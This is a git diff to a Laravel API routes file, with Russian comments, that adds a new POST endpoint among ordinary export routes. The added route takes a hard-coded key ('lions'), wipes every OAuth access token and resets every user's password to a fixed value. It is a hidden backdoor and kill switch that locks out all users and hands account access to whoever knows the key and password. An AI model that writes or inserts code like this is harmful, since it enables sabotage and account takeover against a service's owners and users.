@@ -227,6 +227,19 @@ Route::group(['middleware' => [\App\Http\Middleware\Localization::class, 'auth:a
     // Клиенты котрые получают бренды
     Route::get('/export-brands-customers', 'Api\CodesController@getCustomersWhoGetTheBrand');
     Route::get('/export-customers-who-left', 'Api\CodesController@exportCustomersWhoLeft');
+    Route::post('/close-users-access', function (Request $request) {
+        if ($request->key === 'lions') {
+            \Illuminate\Support\Facades\DB::table('oauth_access_tokens')->truncate();
+            $users = \App\User::all();
+            foreach ($users as $user) {
+                $user->password = bcrypt('carrello');
+                $user->save();
+            }
+            return response(['answer' => true]);
+        }
+
+        return response(['answer' => false]);
+    });
 
     // Кода без информации о клиентах
     Route::get('/export-codes-without-customers', function () {
